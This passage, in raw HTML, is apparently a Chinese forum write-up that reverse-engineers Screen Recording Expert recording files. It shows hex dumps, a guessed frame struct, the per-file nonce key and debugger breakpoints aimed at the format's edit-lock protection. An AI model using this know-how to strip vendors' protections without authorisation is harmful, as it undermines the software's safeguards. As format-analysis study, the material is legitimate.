font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">// nonce = [[_PlayForm]+338]</span><br />memset(nonce_key, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">21u</span>);<br />sprintf(nonce_key, <span style="color: rgb(168, 255, 96);">"%d"</span>, nonce); <span style="color: rgb(146, 255, 184);">// nonce = 15141, 0x3b25</span></code></pre><h4>另两个密钥</h4><p>在文件进行查找，可以发现 <code style="font-family: SFMono-Regular, Consolas, ;">ebp-D4</code> 处的内容是个“长度前缀编码”的数据 (Length-Prefixed Encoding, 简称 LPE)：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">         |  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">02</span> <span style="color: rgb(255, 115, 253);">03</span> <span style="color: rgb(255, 115, 253);">04</span> <span style="color: rgb(255, 115, 253);">05</span> <span style="color: rgb(255, 115, 253);">06</span> <span style="color: rgb(255, 115, 253);">07</span>  <span style="color: rgb(255, 115, 253);">08</span> <span style="color: rgb(255, 115, 253);">09</span> 0A <span style="color: rgb(255, 115, 253);">0B</span> 0C <span style="color: rgb(255, 115, 253);">0D</span> 0E 0F |       说明       |---------+---------------------------------------------------+------------------|<br />00A:B1B0 |                           F6 D4 <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">84</span> A9 <span style="color: rgb(255, 115, 253);">05</span> <span style="color: rgb(255, 115, 253);">00</span> |  帧头            |<br />00A:B1C0 |  <span style="color: rgb(255, 115, 253);">78</span> 9C CC <span style="color: rgb(255, 115, 253);">7D</span> <span style="color: rgb(255, 115, 253);">09</span> <span style="color: rgb(255, 115, 253);">78</span> <span style="color: rgb(255, 115, 253);">54</span> <span style="color: rgb(255, 115, 253);">45</span>  B6 7F F5 <span style="color: rgb(255, 115, 253);">92</span> A4 3B 6B <span style="color: rgb(255, 115, 253);">77</span> |  起始数据        |<br />00A:B1D0 |  <span style="color: rgb(255, 115, 253);">12</span> <span style="color: rgb(255, 115, 253);">42</span> BA <span style="color: rgb(255, 115, 253);">89</span>                                      |                  |         |                                                   |                  |---------+---------------------------------------------------+------------------|         |                                                   |                  |<br /><span style="color: rgb(255, 115, 253);">00B</span>:9C30 |                       EE  D6 <span style="color: rgb(255, 115, 253);">32</span> <span style="color: rgb(255, 115, 253);">34</span> FD <span style="color: rgb(255, 115, 253);">45</span> <span style="color: rgb(255, 115, 253);">24</span> D4 <span style="color: rgb(255, 115, 253);">48</span> |  修改点          |<br /><span style="color: rgb(255, 115, 253);">00B</span>:9C40 |  0A <span style="color: rgb(255, 115, 253);">12</span> <span style="color: rgb(255, 115, 253);">31</span> <span style="color: rgb(255, 115, 253);">72</span> B4 9A EC <span style="color: rgb(255, 115, 253);">50</span>  2F <span style="color: rgb(255, 115, 253);">04</span> 3C                |                  |         |                                                   |                  |---------+---------------------------------------------------+------------------|         |                                                   |                  |<br />00C:86B0 |        <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">61</span> <span style="color: rgb(255, 115, 253);">03</span>  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> CC <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> |  帧后面的内容    |<br />00C:86C0 |  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> FF FF FF FF 5B <span style="color: rgb(255, 115, 253);">03</span>  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> C5 <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> |                  |<br />00C:86D0 |  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">02</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">39</span> <span style="color: rgb(255, 115, 253);">02</span>  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">9D</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> 3A <span style="color: rgb(255, 115, 253);">02</span> |                  |<br />---------+---------------------------------------------------+------------------|</code></pre><p>其中：</p><ul><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">F6 D4 01 00</code>: 表示后续数据的长度为 <code style="font-family: SFMono-Regular, Consolas, ;">0x0001d4f6</code>。</p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>下一节数据在 <code style="font-family: SFMono-Regular, Consolas, ;">0x00AB1B8 + 0x0001d4f6</code>，也就是偏移 <code style="font-family: SFMono-Regular, Consolas, ;">0x00C86B2</code> 处；</p></li></ul><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">84 A9 05 00</code>: 表示解压后的数据长度（猜测）。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">ebp-E8</code> 指向的内容刚好在数据中间</p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>算法为 <code style="font-family: SFMono-Regular, Consolas, ;">0xAB1C0 - 4 + (0x1d4f6 / 2)</code>，也就是 <code style="font-family: SFMono-Regular, Consolas, ;">0xb9c37</code> 处。</p></li></ul></ul><p>不过这个帧与帧之间又有一些“意义不明的数据”，需要结合代码分析。</p><h3>帧储存格式</h3><p>帧与帧之间有很多意义不明的数据，需要想办法知道它的计算规则（或如何正确的跳过这些内容）。</p><p>回溯调用方，找到播放时执行的 <code style="font-family: SFMono-Regular, Consolas, ;">RenderFrame_405B80</code> 方法，再想办法找点“小”的帧数据来看：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">--- 第一帧的数据<br />decompress_enter: pos=CFAF4; exp_len=(<span style="color: rgb(255, 115, 253);">49</span>)decompress_done: pos=CFB3D<br /><span style="color: rgb(255, 115, 253);">49</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>    A2 <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  <span style="color: rgb(146, 255, 184);">// 帧头</span><br /><span style="color: rgb(255, 115, 253);">78</span> <span style="color: rgb(255, 115, 253);">9</span>C <span style="color: rgb(255, 115, 253);">73</span> ... <span style="color: rgb(255, 115, 253);">66</span> <span style="color: rgb(255, 115, 253);">0</span>F <span style="color: rgb(255, 115, 253);">8</span>D       <span style="color: rgb(146, 255, 184);">// 数据</span><br /><span style="color: rgb(146, 255, 184);">// 偏移: CFB3D</span><br />D3 FF FF FF <span style="color: rgb(146, 255, 184);">// 负数，帧结束标志。</span><br />F5 <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> | D0 <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(146, 255, 184);">// 意义不明，两个 f32 浮点数</span><br /><span style="color: rgb(146, 255, 184);">// 新的“帧”开始：</span><br /><span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(146, 255, 184);">// 另一个 LPE，空的</span><br /><span style="color: rgb(255, 115, 253);">2</span>E <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(146, 255, 184);">// 帧开始标识符（负数表示没有更新或结束）</span><br /><span style="color: rgb(255, 115, 253);">25</span> <span style="color: rgb(255, 115, 253);">05</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>|<span style="color: rgb(255, 115, 253);">7</span>D <span style="color: rgb(255, 115, 253);">02</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>|<span style="color: rgb(255, 115, 253);">31</span> <span style="color: rgb(255, 115, 253);">05</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>|<span style="color: rgb(255, 115, 253);">89</span> <span style="color: rgb(255, 115, 253);">02</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(146, 255, 184);">// 坐标</span>--- 第二帧的数据<br /><span style="color: rgb(146, 255, 184);">// 偏移: CFB61</span><br /><span style="color: rgb(255, 115, 253);">98</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(146, 255, 184);">// compressed size</span><br />decompress_enter: pos=CFB65; exp_len=(<span style="color: rgb(255, 115, 253);">98</span>)<br />decompress_done: pos=CFBFD</code></pre><p>整理下逻辑，这就是跨越了 2 “帧”（实际上是帧引用的图像）的数据。</p><p>结合实际猜测，大概是这样的结构：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">frame_data</span> {<br />    <span style="color: rgb(255, 255, 182);">uint32_t</span> compressed_size;<br />    <span style="color: rgb(255, 255, 182);">uint32_t</span> decompressed_size;<br />    <span style="color: rgb(255, 255, 182);">uint8_t</span> compressed_data[compressed_size - <span style="color: rgb(255, 115, 253);">4</span>];};<br /><span style="color: rgb(146, 255, 184);">// 连续的 `other_frame` 结构体。</span><br /><span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">other_frame</span> {<br />    <span style="color: rgb(146, 255, 184);">// 未知数据流</span><br />    <span style="color: rgb(255, 255, 182);">uint32_t</span> stream2_len;<br />    <span style="color: rgb(255, 255, 182);">uint8_t</span> stream2[stream2_len];<br />    <span style="color: rgb(255, 255, 182);">uint32_t</span> frame_id; <span style="color: rgb(146, 255, 184);">// 帧序号</span><br />    <span style="color: rgb(150, 203, 254);">if</span> (frame_id &gt; <span style="color: rgb(255, 115, 253);">0</span>) { <span style="color: rgb(146, 255, 184);">// 负数表示无数据，例如屏幕无更新内容</span><br />        RECT patch_cord; <span style="color: rgb(146, 255, 184);">// 应该是坐标</span><br />        <span style="color: rgb(150, 203, 254);">while</span> (frame_id &gt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />            <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">frame_data</span> frame; <span style="color: rgb(146, 255, 184);">// 帧信息</span><br />            <span style="color: rgb(255, 255, 182);">uint32_t</span> frame_id; <span style="color: rgb(146, 255, 184);">// 帧序号</span>        }    }<br />    <span style="color: rgb(146, 255, 184);">// field_24 == 1 的情况，会有两个额外的 f32 数据。</span><br />    <span style="color: rgb(150, 203, 254);">if</span> (field_24 == <span style="color: rgb(255, 115, 253);">1</span>) {<br />        <span style="color: rgb(255, 255, 182);">float</span> unknown_1;<br />        <span style="color: rgb(255, 255, 182);">float</span> unknown_2;    }<br />};</code></pre><p>毕竟是个播放器，合理怀疑 <code style="font-family: SFMono-Regular, Consolas, ;">stream2</code> 储存的数据其实是用于辅助定位上一个“完整帧”的信息或鼠标指针数据。<br />不过看起来和“编辑加密”的锁定无关，就没继续跟进了。</p><p>大概分析清楚“帧”储存的格式后，就可以尝试定位数据的起始位置。</p><h3>帧开始的地方</h3><p>首先对 <code style="font-family: SFMono-Regular, Consolas, ;">_PlayForm</code> 地址下写入断点，看它如何赋值（EXE 自带符号，x64dbg 直接输入即可）。</p><p>断在 <code style="font-family: SFMono-Regular, Consolas, ;">004965A4</code>，发现是实例化新类的代码中间：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 115, 253);">00439944</span> | <span style="color: rgb(255, 115, 253);">8918</span>          | <span style="color: rgb(150, 203, 254);">mov</span> dword ptr ds:[eax],ebx |</code></pre><p>回溯一下：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(198, 197, 254);">lb_00401341:</span><br />  <span style="color: rgb(150, 203, 254);">mov</span> ecx,dword ptr ds:[4961C8]<br />  <span style="color: rgb(150, 203, 254);">mov</span> eax,dword ptr ds:[ecx]<br />  <span style="color: rgb(150, 203, 254);">mov</span> ecx,dword ptr ds:[&lt;&amp;_PlayForm&gt;]<br />  <span style="color: rgb(150, 203, 254);">mov</span> edx,dword ptr ds:[48E980]<br />  <span style="color: rgb(150, 203, 254);">call</span> <span style="color: rgb(255, 115, 253);">0x0043992C</span>                       <span style="color: rgb(146, 255, 184);">; 调用实例化方法</span><br /><span style="color: rgb(198, 197, 254);"><br />lb_0040135A:</span> <br />  <span style="color: rgb(150, 203, 254);">mov</span> eax,dword ptr ds:[4961C8]         <span style="color: rgb(146, 255, 184);">; 执行到此处时，[_PlayForm]+338 的初始化已完成</span></code></pre><p>等 CALL 结束后已经太迟了，因此在 <code style="font-family: SFMono-Regular, Consolas, ;">004965A4</code> 赋值之后对 <code style="font-family: SFMono-Regular, Consolas, ;">[_PlayForm]+338</code> 下硬件写入断点。</p><p>继续运行，断在此处：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(198, 197, 254);">lb_004089E5:</span><br />  <span style="color: rgb(150, 203, 254);">mov</span> dword ptr ds:[ebx+<span style="color: rgb(255, 115, 253);">338</span>],edx<br />  <span style="color: rgb(150, 203, 254);">jmp</span> <span style="color: rgb(255, 115, 253);">0x00408A51</span></code></pre><p>放到 IDA 里一看，发现在 <code style="font-family: SFMono-Regular, Consolas, ;">_TPlayForm_FormCreate</code> 函数内。</p><p>然后快速过一遍这个函数，发现该函数进行了基本的初始化。例如从文件末尾读入 <code style="font-family: SFMono-Regular, Consolas, ;">0x2c</code> 字节：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">         |  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">02</span> <span style="color: rgb(255, 115, 253);">03</span> <span style="color: rgb(255, 115, 253);">04</span> <span style="color: rgb(255, 115, 253);">05</span> <span style="color: rgb(255, 115, 253);">06</span> <span style="color: rgb(255, 115, 253);">07</span>  <span style="color: rgb(255, 115, 253);">08</span> <span style="color: rgb(255, 115, 253);">09</span> 0A <span style="color: rgb(255, 115, 253);">0B</span> 0C <span style="color: rgb(255, 115, 253);">0D</span> 0E 0F |      预览区      |---------+---------------------------------------------------+------------------|<br />37A:65BB |  <span style="color: rgb(255, 115, 253);">25</span> 3B <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> | %<span style="color: rgb(146, 255, 184);">;.............. |</span><br />37A:65CB |  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">08</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  <span style="color: rgb(255, 115, 253);">08</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> 0A AE 0A <span style="color: rgb(255, 115, 253);">00</span> | ................ |<br />37A:65DB |  <span style="color: rgb(255, 115, 253);">70</span> <span style="color: rgb(255, 115, 253);">6D</span> 6C <span style="color: rgb(255, 115, 253);">78</span> 7A 6A <span style="color: rgb(255, 115, 253);">74</span> 6C  <span style="color: rgb(255, 115, 253);">78</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>             | pmlxzjtlx...     |<br />---------+---------------------------------------------------+------------------|</code></pre><p>简单分析下这段数据：</p><ul><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">0x00</code> 处就是“文件密钥”了，我认为它是“每个文件都有的一个随机值”，称之为 <code style="font-family: SFMono-Regular, Consolas, ;">nonce</code>；</p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>未锁定的时候这里是 <code style="font-family: SFMono-Regular, Consolas, ;">0</code>。</p></li></ul><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">0x1c</code> 处为 <code style="font-family: SFMono-Regular, Consolas, ;">0A AE 0A 00</code>，小端序读取是 <code style="font-family: SFMono-Regular, Consolas, ;">0xaae0a</code>。这是数据起始的位置；</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">0x20</code> 处是用于判定文件是否为“屏幕录像专家生成的录像文件”特征码 (magic number)。</p></li><li style="margin-left: 2px;"><p>其他内容不明。</p></li></ul><p>部分窗体的数据稍后在 <code style="font-family: SFMono-Regular, Consolas, ;">_TPlayForm_repareplay1</code> 读取，从文件的 <code style="font-family: SFMono-Regular, Consolas, ;">-0xE0</code> 到 <code style="font-family: SFMono-Regular, Consolas, ;">-0xE0 + 0xB4</code>：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 115, 253);">37</span>A:<span style="color: rgb(255, 115, 253);">6507</span>  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  ................ <br /><span style="color: rgb(255, 115, 253);">37</span>A:<span style="color: rgb(255, 115, 253);">6517</span>  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  ................ <br /><span style="color: rgb(255, 115, 253);">37</span>A:<span style="color: rgb(255, 115, 253);">6527</span>  <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  ................ <br /><span style="color: rgb(255, 115, 253);">37</span>A:<span style="color: rgb(255, 115, 253);">6537</span>  <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> CE E1 <span style="color: rgb(150, 203, 254);">B0 </span>AE C6 C6 <span style="color: rgb(150, 203, 254);">BD </span>E2  ........吾爱破解  &lt;-- GBK 编码<br /><span style="color: rgb(255, 115, 253);">37</span>A:<span style="color: rgb(255, 115, 253);">6547</span>  C5 E0 D1 <span style="color: rgb(150, 203, 254);">B5 </span><span style="color: rgb(150, 203, 254);">B5 </span>DA C1 F9 <span style="color: rgb(150, 203, 254);">BF </span>CE <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  培训第六课......      窗体标题<br /><span style="color: rgb(255, 115, 253);">37</span>A:<span style="color: rgb(255, 115, 253);">6557</span>  <span style="color: rgb(255, 115, 253);">03</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">02</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  ................ <br /><span style="color: rgb(255, 115, 253);">37</span>A:<span style="color: rgb(255, 115, 253);">6567</span>  <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  ................ <br /><span style="color: rgb(255, 115, 253);">37</span>A:<span style="color: rgb(255, 115, 253);">6577</span>  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  ................ <br /><span style="color: rgb(255, 115, 253);">37</span>A:<span style="color: rgb(255, 115, 253);">6587</span>  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  ................ <br /><span style="color: rgb(255, 115, 253);">37</span>A:<span style="color: rgb(255, 115, 253);">6597</span>  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 